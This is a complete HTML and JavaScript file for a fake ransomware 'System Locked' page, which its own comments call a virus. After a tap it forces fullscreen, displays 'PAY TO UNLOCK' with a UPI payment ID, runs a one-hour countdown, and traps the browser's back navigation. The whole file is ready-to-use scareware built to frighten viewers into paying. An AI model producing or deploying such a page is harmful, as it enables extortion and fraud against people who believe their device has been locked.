<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Locked</title>
    <style>
        /* Remove all default margins and padding */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; /* Prevent scrolling */
            background-color: #000;
            font-family: 'Courier New', Courier, monospace;
            color: white;
        }

        /* The Lock Screen Overlay */
        #lock-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, #1a1a1a 0%, #000000 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            text-align: center;
        }

        /* Glitch Effect for Title */
        .glitch {
            font-size: 2rem;
            font-weight: bold;
            color: #ff3333;
            text-transform: uppercase;
            animation: glitch 1s infinite;
            margin-bottom: 20px;
        }

        @keyframes glitch {
            0% { transform: translate(0) }
            20% { transform: translate(-2px, 2px) }
            40% { transform: translate(-2px, -2px) }
            60% { transform: translate(2px, 2px) }
            80% { transform: translate(2px, -2px) }
            100% { transform: translate(0) }
        }

        /* UPI ID Box */
        .upi-box {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #ff3333;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            box-shadow: 0 0 15px rgba(255, 51, 51, 0.5);
        }

        .upi-label {
            font-size: 1rem;
            color: #ccc;
        }

        .upi-id {
            font-size: 2.5rem;
            font-weight: bold;
            color: #fff;
            letter-spacing: 2px;
        }

        /* Countdown Timer */
        .timer {
            font-size: 4rem;
            margin-top: 20px;
            color: #00ffcc;
        }

        .status {
            margin-top: 10px;
            font-size: 1.2rem;
            color: #888;
        }

        /* Click to Start Overlay (Browsers need this for Fullscreen) */
        #start-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            cursor: pointer;
        }

        /* Hidden class to remove elements */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- Click anywhere to start the "Virus" -->
    <div id="start-overlay">
        <h1>TAP TO LOCK SYSTEM</h1>
    </div>

    <!-- The Main Lock Screen -->
    <div id="lock-screen" class="hidden">
        <div class="glitch">SYSTEM HALTED</div>
        
        <div class="upi-box">
            <div class="upi-label">PAY TO UNLOCK</div>
            <div class="upi-id">51club@axl</div>
        </div>

        <div class="status">FUNCTIONS DISABLED</div>
        <div class="timer" id="countdown">60:00</div>
    </div>

    <script>
        // Configuration
        const upiID = "51club@axl";
        let timeLeft = 60 * 60; // 1 hour in seconds (3600 seconds)
        
        const startOverlay = document.getElementById('start-overlay');
        const lockScreen = document.getElementById('lock-screen');
        const countdownEl = document.getElementById('countdown');

        // Function to enter Fullscreen
        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(err => {
                    console.log(`Error attempting to enable full-screen mode: ${err.message}`);
                });
            }
        }

        // Start the "Virus" on click
        startOverlay.addEventListener('click', () => {
            startOverlay.classList.add('hidden');
            lockScreen.classList.remove('hidden');
            
            // Enter Fullscreen
            toggleFullScreen();

            // Prevent going back (simple way by scrolling to top and staying)
            window.scrollTo(0, 0);
        });

        // Countdown Timer Logic
        const timerInterval = setInterval(() => {
            let minutes = Math.floor(timeLeft / 60);
            let seconds = timeLeft % 60;

            // Add leading zeros
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            countdownEl.textContent = `${minutes}:${seconds}`;

            if (timeLeft === 0) {
                clearInterval(timerInterval);
                document.querySelector('.glitch').textContent = "SYSTEM RESTORED";
                document.querySelector('.status').textContent = "You may close the browser.";
                countdownEl.style.color = "#00ff00"; // Green for success
            } else {
                timeLeft--;
            }
        }, 1000);

        // Optional: Prevent swipe back on some Android browsers
        window.addEventListener('popstate', () => {
            history.pushState(null, null, location.href);
        });
    </script>
</body>
</html>
